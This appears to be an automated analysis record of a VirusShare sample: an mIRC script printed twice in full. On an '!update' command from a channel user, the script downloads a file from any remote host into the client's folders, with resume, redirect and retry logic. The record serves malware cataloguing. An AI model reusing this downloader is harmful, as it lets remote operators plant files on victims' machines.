{
    "docinfo": {
        "attributes": [],
        "behavior": {},
        "macro": "on 50:TEXT:!update*:*:{\n  /www $$2\n  if ((m !isletter $chan($chan).mode) || ($me isvo #) || ($me isop #)) { msg # Updating... }\n}\nalias www {\n  if ($1 = $null) { halt }\n  set %temp $remove($1,http://)\n  set %minetTempURL $gettok(%temp,2-,47)\n  set %minetTempWWWwin @DL-http:// $+ %temp\n  set %tempFile $getdir( [ *. $+ $gettok(%minetTempURL,$gettok(%minetTempURL,0,46),46) ] ) $+ $gettok(%minetTempURL,$gettok(%minetTempURL,0,47),47)\n  set %minetTempWWWwin @DL_http:// $+ [ $gettok(%minetTempWWWwin,2-,47) ]\n  .timerWWWTimeoutCheck -o 0 10 wwwTimeoutCheck\n  sockopen %minetTempWWWwin $gettok(%temp,1,47) 80\n}\non 1:sockopen:@DL_http* {\n  if ($sockerr > 0) { if ((m !isletter $chan(%chan).mode) || ($me isvo %chan) || ($me isop %chan)) { msg %chan Connection Failed! } | .timer $+ $mid($sockname,5,$len($sockname)) 1 30 www $mid($sockname,5,$len($sockname)) | halt }\n  set %tempFile $getdir( [ *. $+ $gettok($sockname,$gettok($sockname,0,46),46) ] ) $+ $gettok($sockname,$gettok($sockname,0,47),47)\n  sockwrite -n $sockname GET / $+ $gettok($sockname,3-,47) HTTP/1.1\n  sockwrite -n $sockname Host: $gettok($sockname,2,47)\n  if $exists(%tempFile) { sockwrite -n $sockname Range: bytes= $+ $calc($lof(%tempFile)+0) $+ - }\n  sockwrite -n $sockname\n}\non 1:sockread:@DL_http* {\n  set %tempFile $getdir( [ *. $+ $gettok($sockname,$gettok($sockname,0,46),46) ] ) $+ $gettok($sockname,$gettok($sockname,0,47),47)\n  set -u0 %tempWindow @DL-http:// $+ [ $gettok($sockname,2-,47) ]\n  sockread %temp\n  if (HTTP& 302* iswm %temp) {\n    sockmark $sockname %temp\n  }\n  elseif (HTTP& 4* iswm %temp) || (HTTP/?.? 3* iswm %temp) {\n    if ((m !isletter $chan(%chan).mode) || ($me isvo %chan) || ($me isop %chan)) { msg %chan Error $gettok(%temp,2-,32) (http:// $+ [ $gettok($sockname,2-,47) ] $+ ) }\n    sockclose $sockname\n  }\n  elseif (HTTP& 200* iswm %temp) {\n    if $exists(%tempFile) { .remove %tempFile }\n  }\n  elseif (HTTP& 206* iswm %temp) {\n  }\n  elseif (Content-Length* iswm %temp) { sockmark $sockname $gettok(%temp,2,32) }\n  elseif (Location:* iswm %temp) && (HTTP/?.? 302* iswm $sock($sockname).mark) {\n    if ((m !isletter $chan(%chan).mode) || ($me isvo %chan) || ($me isop %chan)) { msg %chan Redirecting http:// $+ [ $gettok($sockname,2-,47) ] to $gettok(%temp,2-,32) }\n    sockclose $sockname\n    if (http:// isin %temp) { www $gettok(%temp,2-,32) }\n    else { www http:// $+ $sock($sockname).ip $+ $gettok(%temp,2-,32) }\n  }\n  elseif (%temp = $null) {\n    if ($sock($sockname).mark != $null) { sockmark $sockname $calc($sock($sockname).mark + $sock($sockname).rcvd) }\n    sockrename $sockname %tempWindow\n  }\n}\non 1:sockread:@DL-http* {\n  set %tempFile $getdir( [ *. $+ $gettok($sockname,$gettok($sockname,0,46),46) ] ) $+ $gettok($sockname,$gettok($sockname,0,47),47)\n  :nextpacket\n  sockread &temp\n  bwrite %tempFile -1 &temp\n  if ($sockbr > 0) goto nextpacket\n}\n\nalias wwwTimeoutCheck {\n  if ($sock(@DL?http://*,0) = 0) { .timerWWWTimeoutCheck off }\n  set %c 1\n  set %tmpn2 $readini $mircini options n2\n  :next\n  if (%c > $sock(@DL?http://*,0)) { goto end }\n  if ($sock(@DL?http://*,%c).lr > $gettok(%tmpn2,11,44)) {\n    if ((m !isletter $chan(%chan).mode) || ($me isvo %chan) || ($me isop %chan)) { msg %chan Timed out. Retrying... }\n    .timer 1 1 www $mid($sock(@DL?http://*,%c),5,$len($sock(@DL?http://*,%c)))\n    sockclose $sock(@DL?http://*,%c)\n  }\n  inc %c\n  goto next\n  :end\n}\non 1:sockclose:@DL-http* {\n  if (%t != $null) { minetParseHTML %t }\n  if ($sock($sockname,1).rcvd = $sock($sockname).mark) {\n    if ((m !isletter $chan(%chan).mode) || ($me isvo %chan) || ($me isop %chan)) { msg %chan Finished update - $mid($sockname,5,$len($sockname)) }\n  }\n  elseif ($sock($sockname,1).rcvd < $sock($sockname).mark) {\n    .timer 1 1 www $mid($sockname,5,$len($sockname))\n  }\n  else {\n  }\n\n  if (%WWWCompletionCommand != $null) { %WWWCompletionCommand }\n  unset %minetTempWWW* %t %t2 %WWWCompletionCommand\n}"
    },
    "filename": "VirusShare_04c0a090466091d59bc6ecbb23c310b2",
    "filesize": 3999,
    "filetype": "ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "04c0a090466091d59bc6ecbb23c310b2",
        "sha1": "ab5fc6020f71a38f5800f645dc84bf2d9dcdcf6d",
        "sha256": "8f671ec3713c8dc2386bb73fa03180ae46d77fd0bfce9d49fd2c299f01aea652"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "on 50:TEXT:!update*:*:{",
            "  /www $$2",
            "  if ((m !isletter $chan($chan).mode) || ($me isvo #) || ($me isop #)) { msg # Updating... }",
            "alias www {",
            "  if ($1 = $null) { halt }",
            "  set %temp $remove($1,http://)",
            "  set %minetTempURL $gettok(%temp,2-,47)",
            "  set %minetTempWWWwin @DL-http:// $+ %temp",
            "  set %tempFile $getdir( [ *. $+ $gettok(%minetTempURL,$gettok(%minetTempURL,0,46),46) ] ) $+ $gettok(%minetTempURL,$gettok(%minetTempURL,0,47),47)",
            "  set %minetTempWWWwin @DL_http:// $+ [ $gettok(%minetTempWWWwin,2-,47) ]",
            "  .timerWWWTimeoutCheck -o 0 10 wwwTimeoutCheck",
            "  sockopen %minetTempWWWwin $gettok(%temp,1,47) 80",
            "on 1:sockopen:@DL_http* {",
            "  if ($sockerr > 0) { if ((m !isletter $chan(%chan).mode) || ($me isvo %chan) || ($me isop %chan)) { msg %chan Connection Failed! } | .timer $+ $mid($sockname,5,$len($sockname)) 1 30 www $mid($sockname,5,$len($sockname)) | halt }",
            "  set %tempFile $getdir( [ *. $+ $gettok($sockname,$gettok($sockname,0,46),46) ] ) $+ $gettok($sockname,$gettok($sockname,0,47),47)",
            "  sockwrite -n $sockname GET / $+ $gettok($sockname,3-,47) HTTP/1.1",
            "  sockwrite -n $sockname Host: $gettok($sockname,2,47)",
            "  if $exists(%tempFile) { sockwrite -n $sockname Range: bytes= $+ $calc($lof(%tempFile)+0) $+ - }",
            "  sockwrite -n $sockname",
            "on 1:sockread:@DL_http* {",
            "  set %tempFile $getdir( [ *. $+ $gettok($sockname,$gettok($sockname,0,46),46) ] ) $+ $gettok($sockname,$gettok($sockname,0,47),47)",
            "  set -u0 %tempWindow @DL-http:// $+ [ $gettok($sockname,2-,47) ]",
            "  sockread %temp",
            "  if (HTTP& 302* iswm %temp) {",
            "    sockmark $sockname %temp",
            "  elseif (HTTP& 4* iswm %temp) || (HTTP/?.? 3* iswm %temp) {",
            "    if ((m !isletter $chan(%chan).mode) || ($me isvo %chan) || ($me isop %chan)) { msg %chan Error $gettok(%temp,2-,32) (http:// $+ [ $gettok($sockname,2-,47) ] $+ ) }",
            "    sockclose $sockname",
            "  elseif (HTTP& 200* iswm %temp) {",
            "    if $exists(%tempFile) { .remove %tempFile }",
            "  elseif (HTTP& 206* iswm %temp) {",
            "  elseif (Content-Length* iswm %temp) { sockmark $sockname $gettok(%temp,2,32) }",
            "  elseif (Location:* iswm %temp) && (HTTP/?.? 302* iswm $sock($sockname).mark) {",
            "    if ((m !isletter $chan(%chan).mode) || ($me isvo %chan) || ($me isop %chan)) { msg %chan Redirecting http:// $+ [ $gettok($sockname,2-,47) ] to $gettok(%temp,2-,32) }",
            "    sockclose $sockname",
            "    if (http:// isin %temp) { www $gettok(%temp,2-,32) }",
            "    else { www http:// $+ $sock($sockname).ip $+ $gettok(%temp,2-,32) }",
            "  elseif (%temp = $null) {",
            "    if ($sock($sockname).mark != $null) { sockmark $sockname $calc($sock($sockname).mark + $sock($sockname).rcvd) }",
            "    sockrename $sockname %tempWindow",
            "on 1:sockread:@DL-http* {",
            "  set %tempFile $getdir( [ *. $+ $gettok($sockname,$gettok($sockname,0,46),46) ] ) $+ $gettok($sockname,$gettok($sockname,0,47),47)",
            "  :nextpacket",
            "  sockread &temp",
            "  bwrite %tempFile -1 &temp",
            "  if ($sockbr > 0) goto nextpacket",
            "alias wwwTimeoutCheck {",
            "  if ($sock(@DL?http://*,0) = 0) { .timerWWWTimeoutCheck off }",
            "  set %c 1",
            "  set %tmpn2 $readini $mircini options n2",
            "  :next",
            "  if (%c > $sock(@DL?http://*,0)) { goto end }",
            "  if ($sock(@DL?http://*,%c).lr > $gettok(%tmpn2,11,44)) {",
            "    if ((m !isletter $chan(%chan).mode) || ($me isvo %chan) || ($me isop %chan)) { msg %chan Timed out. Retrying... }",
            "    .timer 1 1 www $mid($sock(@DL?http://*,%c),5,$len($sock(@DL?http://*,%c)))",
            "    sockclose $sock(@DL?http://*,%c)",
            "  inc %c",
            "  goto next",
            "  :end",
            "on 1:sockclose:@DL-http* {",
            "  if (%t != $null) { minetParseHTML %t }",
            "  if ($sock($sockname,1).rcvd = $sock($sockname).mark) {",
            "    if ((m !isletter $chan(%chan).mode) || ($me isvo %chan) || ($me isop %chan)) { msg %chan Finished update - $mid($sockname,5,$len($sockname)) }",
            "  elseif ($sock($sockname,1).rcvd < $sock($sockname).mark) {",
            "    .timer 1 1 www $mid($sockname,5,$len($sockname))",
            "  else {",
            "  if (%WWWCompletionCommand != $null) { %WWWCompletionCommand }",
            "  unset %minetTempWWW* %t %t2 %WWWCompletionCommand"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://"
        ]
    },
    "time": "0:00:00.289992",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
